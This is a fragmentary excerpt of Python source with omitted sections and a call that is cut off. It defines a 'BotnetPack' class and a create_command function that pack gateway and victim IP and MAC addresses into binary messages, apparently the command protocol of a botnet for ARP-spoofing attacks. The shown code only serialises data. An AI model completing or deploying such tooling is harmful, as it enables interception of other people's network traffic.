...
class BotnetPack:
    ...
    def create_byte_stream(self):
        return struct.pack(SERIALIZATION_FORMAT,
                           TYPES.NETWORK_SYNC_REQUEST,

                           self.command.act,
                           self.command.g_ip,
                           self.command.v_ip,
                           int(self.command.g_mac[0]),
                           int(self.command.g_mac[1]),
                           int(self.command.g_mac[2]),
                           int(self.command.g_mac[3]),
                           int(self.command.g_mac[4]),
                           int(self.command.g_mac[5]),
                           int(self.command.v_mac[0]),
                           int(self.command.v_mac[1]),
                           int(self.command.v_mac[2]),
                           int(self.command.v_mac[3]),
                           int(self.command.v_mac[4]),
                           int(self.command.v_mac[5]),
...
def create_command(act, g_ip, v_ip, g_mac, v_mac):
    return struct.pack(SERIALIZATION_FORMAT, TYPES.COMMAND, act, ip2int(g_ip), ip2int(v_ip),
